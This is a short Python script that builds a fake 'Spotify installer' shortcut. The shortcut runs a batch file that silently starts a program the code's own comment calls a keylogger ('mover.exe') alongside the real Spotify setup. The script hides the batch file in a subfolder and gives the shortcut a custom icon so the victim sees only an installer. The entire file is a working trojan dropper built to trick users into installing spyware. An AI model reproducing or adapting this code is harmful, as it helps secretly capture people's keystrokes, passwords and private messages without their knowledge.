import os
from subprocess import check_output
from win32com.client import Dispatch

print("installing Spotify")

# get current path
curr_path = os.getcwd()

# create the content of the bat file, running silently the keylogger while installing spotify
bat_script = open("td.bat", "w")
content = '@echo off\nstart "" "mover.exe"\nstart "" "SpotifySetup.exe"'
bat_script.write(content)
bat_script.close()

# hide the bat file into a folder
cmd = "move td.bat dist\lib"
check_output(cmd, shell=True)

# create a shortcut and change icon
path = os.path.join(curr_path, "SpotifyInstaller.lnk")
target = curr_path + '\\dist\lib\\td.bat'
wDir = curr_path
icon = curr_path +'\\test.ico'

shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()
